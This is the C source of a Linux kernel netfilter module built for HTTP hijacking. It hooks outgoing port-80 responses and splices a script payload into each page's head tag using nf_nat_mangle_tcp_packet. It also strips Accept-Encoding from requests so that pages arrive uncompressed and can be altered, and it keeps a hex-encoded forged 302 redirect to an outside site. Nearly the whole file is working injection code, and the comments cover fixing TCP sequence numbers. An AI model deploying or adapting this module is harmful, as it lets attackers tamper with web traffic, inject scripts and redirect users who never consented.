#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/if_packet.h>
#include <linux/socket.h>
#include <linux/skbuff.h>

#include <net/ip.h>
#include <net/tcp.h>

#include <net/checksum.h>
#include <net/route.h>

#include <net/netfilter/nf_conntrack.h>
#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_conntrack_ecache.h>
#include <net/netfilter/nf_conntrack_expect.h>
#include <net/netfilter/nf_nat.h>
#include <net/netfilter/nf_nat_core.h>
#include <net/netfilter/nf_nat_helper.h>

char shellcode[] = "<head><script>alert('hijacking test!')</script>";
char target_ip[] = "\xb6\xfe\xe3\xcc";
char hack_str[] = "\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x31\x36\x30\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x0d\x0a\x44\x61\x74\x65\x3a\x20\x4d\x6f\x6e\x2c\x20\x31\x36\x20\x4d\x61\x79\x20\x32\x30\x31\x36\x20\x30\x38\x3a\x32\x34\x3a\x33\x32\x20\x47\x4d\x54\x0d\x0a\x4C\x6F\x63\x61\x74\x69\x6F\x6E\x3A\x20\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x68\x69\x74\x68\x79\x2E\x63\x6E\x2F\x74\x65\x73\x74\x2E\x68\x74\x6D\x6C\x0D\x0A\x53\x65\x72\x76\x65\x72\x3a\x20\x41\x70\x61\x63\x68\x65\x0d\x0a\x0d\x0a\x3c\x68\x74\x6d\x6c\x3e\x0d\x0a\x3c\x68\x65\x61\x64\x3e\x3c\x74\x69\x74\x6c\x65\x3e\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x3c\x2f\x68\x65\x61\x64\x3e\x0d\x0a\x3c\x62\x6f\x64\x79\x20\x62\x67\x63\x6f\x6c\x6f\x72\x3d\x22\x77\x68\x69\x74\x65\x22\x3e\x0d\x0a\x3c\x63\x65\x6e\x74\x65\x72\x3e\x3c\x68\x31\x3e\x33\x30\x32\x20\x46\x6f\x75\x6e\x64\x3c\x2f\x68\x31\x3e\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x0d\x0a\x3c\x68\x72\x3e\x3c\x63\x65\x6e\x74\x65\x72\x3e\x6e\x67\x69\x6e\x78\x2f\x31\x2e\x32\x2e\x34\x3c\x2f\x63\x65\x6e\x74\x65\x72\x3e\x0d\x0a\x3c\x2f\x62\x6f\x64\x79\x3e\x0d\x0a\x3c\x2f\x68\x74\x6d\x6c\x3e\x0d\x0a";

typedef struct Pseudo_Header {
	unsigned int saddr;
	unsigned int daddr;
	unsigned char res;
	unsigned char proto;
	unsigned short len;
}pse_hd;

unsigned short checksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;

	uint16_t * w = addr;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= sizeof(uint16_t);
	}

	if (nleft == 1) {
		*(uint8_t *) (&answer) = *(uint8_t *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcph)
{
	unsigned short tcp_len;
	unsigned short ret = 0;
	unsigned short ip_len = 0;
	char *buf = NULL;
	ip_len = (ip_hd->ihl & 0x0f) * 4;
	tcp_len = ntohs(ip_hd->tot_len) - ((ip_hd->ihl & 0x0f) * 4);
	buf = kmalloc(tcp_len + sizeof(pse_hd), GFP_KERNEL);
	if(buf == NULL)
	{
		printk(KERN_ALERT "hook_ipv4: Error in malloc mem\n");
		return 0;
	}

	pse_hd *phd = (pse_hd *)buf;
	phd->saddr = ip_hd->saddr;
	phd->daddr = ip_hd->daddr;
	phd->res = 0;
	phd->proto = IPPROTO_TCP;
	phd->len = htons(tcp_len);
	memcpy(buf+sizeof(pse_hd),tcph,tcp_len);
	tcph = (struct tcphdr *)(buf+sizeof(pse_hd));
	tcph->check = 0;
	ret = checksum((unsigned short *)buf, tcp_len+sizeof(pse_hd));
	kfree(buf);
	return ret; 
}

int delete_padding(char *buf)
{
	char *pl = NULL;
	char *pr = NULL;
	
	pl = strstr(buf,"<");
	pr = strstr(buf,">");
	if(pl != NULL && pr != NULL)
	{
		if((long long)pl - (long long)pr > 0)
		{
			memset(buf,' ',(long long)pl - (long long)buf);
		}
	}
}

// int check_insert(char *pkg)
// {
// 	int max_size = 0;
// 	int len = 0;
// 	char *phtml = NULL;
// 	char *pbody = NULL;
// 	char *ptemp = NULL;
	
// 	if(strstr(pkg,"<html") != NULL){
// 		phtml = strstr(pkg,"<html");
// 		phtml += 5;
// 	}else if(strstr(pkg,"<!DOCTYPE html") != NULL){
// 		phtml = strstr(pkg,"<!DOCTYPE html");
// 		phtml += 14;
// 	}else{
// 		return 0;
// 	}

// 	printk(KERN_ALERT "hook_ipv4: HTML tag found\n");
		
// 	phtml[0] = '>';
// 	memcpy(phtml + 1,shellcode,strlen(shellcode));
// 	delete_padding(phtml + 1 + strlen(shellcode));
	
// 	return 1;
// }

int delete_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;
	
	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)
		return 0;
	
	printk(KERN_ALERT "hook_ipv4: Accept-Encoding found");
	
	pV = strstr(pK,"\r\n");
	if(pV == NULL)
		return 0;
	
	len = (long long)pV - (long long)pK;
	
	printk(KERN_ALERT "hook_ipv4: Delete Coding: %d\n",len);
	
	memset(pK - 2,' ',len + 2);
	return 1;
}

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *iph = ip_hdr(skb);
	unsigned short iph_len = ip_hdrlen(skb);
	unsigned short tol_len = ntohs(iph->tot_len);

	if (iph->protocol == IPPROTO_TCP)
	{
		struct tcphdr *tcph = tcp_hdr(skb);
		unsigned int src_ip = (unsigned int)iph->saddr;
		unsigned int dest_ip = (unsigned int)iph->daddr;

		unsigned int src_port = (unsigned int)ntohs(tcph->source);
		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
		
		if (src_port == 80)
		{

			if (memcmp(pkg,"HTTP/1.1",8) != 0)
			{
				return NF_ACCEPT;
			}
			//memcpy(pkg,hack_str,strlen(hack_str));
			// if(check_insert(pkg))
			// {
			// 	printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
			// 	printk(KERN_ALERT "hook_ipv4: Insert success\n");
			// }

			enum ip_conntrack_info ctinfo;
			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

			char *phead = strstr(pkg,"<head>");
			if(phead == NULL){
				return NF_ACCEPT;
			}
			// sudo iptables -t nat --list
			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph_len,
                                        phead - pkg, 6,
                                        shellcode, strlen(shellcode))) {
                printk("insert success\n");
            }
		}
		else if (dest_port == 80)
		{
			if (memcmp(pkg,"GET / HTTP/1.1",strlen("GET / HTTP/1.1")) != 0)
			{
				return NF_ACCEPT;
			}
			
			delete_encoding(pkg);
		}

		unsigned short cs = checksum_tcp(iph, tcph);
		tcph->check = cs;
	}
	return NF_ACCEPT;
}


unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
        const struct net_device *in, const struct net_device *out, int(*okfn)(
                struct sk_buff *))
{
    enum ip_conntrack_info ctinfo;

    //Note that the connection tracking subsystem
    //is invoked after the raw table has been processed, but before the mangle table.
    //所以下面 要指定.priority = NF_IP_PRI_MANGLE  nf_ct_get 才会返回有效的值
    struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

    //调用nf_nat_seq_adjust函数，修正nf_nat_mangle_tcp_packet 之后造成的tcp包的序列号不对问题
    //这个需要在修改后的双向网络包上都要进行，所以需要hook双向的吧？，nf_nat_mangle_tcp_packet
    //中调用了adjust_tcp_sequence知识记录下了应该作的修改。
    //因为nf_nat_mangle_tcp_packet  给需要进行序号修正的conntrack加上IPS_SEQ_ADJUST_BIT标志了。
    //所以这里判断是不是这个标志就进行修改。不知道这会不会和其他nat helper moudle冲突，如果别人也用这个
    //标志时就可能出现重复修改等问题，因为里面的序号调整结构都是通用的。
    //也许进行更细致的检查，比如给conntrack的ct结构加上 其他唯一的status标志比较好一点，
    //反正就是要保证我们要修复序号的包是我们前面用nf_nat_mangle_tcp_packet
    //修改过包内容的那个连接的，而不是其他的连接的包。
    //写一个nat helper module来修改tcp包也许比在这种hook module里面进行修改更合适。去看看netfilter的文档看看。
    //因为我确信自己系统  没有运行nat help module，所以为了简单就这样进行修改了，测试过没有什么问题。
    //最好研究一下nat conntrack的那些代码，我也不是清楚具体的细节。

	// printk(KERN_ALERT "pre nf_nat_seq_adjust\n");
    if (ct  &&  test_bit(IPS_SEQ_ADJUST_BIT, &ct->status)
            && (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
        // nf_nat_seq_adjust(skb, ct, ctinfo);
    	printk(KERN_ALERT "nf_nat_seq_adjust]n");
    }

    return NF_ACCEPT;
  
}

static struct nf_hook_ops http_hooks = 
{ 
	.pf = NFPROTO_IPV4, /*IPV4 协议的*/
    .priority = NF_IP_PRI_MANGLE , // NF_IP_PRI_FIRST, //NF_IP_PRI_LAST ;NF_IP_PRI_NAT_SRC ;
    .hooknum = NF_INET_POST_ROUTING, /* NF_IP_LOCAL_OUT 我们只处理出去的网路包 */
    .hook = hook_func,
    .owner = THIS_MODULE, 
};

static struct nf_hook_ops seq_adjust[] = {
    {
	    .hook           = fix_seq,
	    .owner          = THIS_MODULE,
	    .pf             = PF_INET,
	    .hooknum        = NF_INET_LOCAL_OUT,
    	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
    },
    {
        .hook           = fix_seq,
        .owner          = THIS_MODULE,
        .pf             = PF_INET,
        .hooknum        = NF_INET_LOCAL_IN,
        .priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
    },
};

int init_hook(void)
{
	nf_register_hooks(seq_adjust, ARRAY_SIZE(seq_adjust));
	nf_register_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

void cleanup_hook(void)
{
	nf_unregister_hooks(seq_adjust, ARRAY_SIZE(seq_adjust));
	nf_unregister_hook(&http_hooks);

	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}

module_init(init_hook);
module_exit(cleanup_hook);
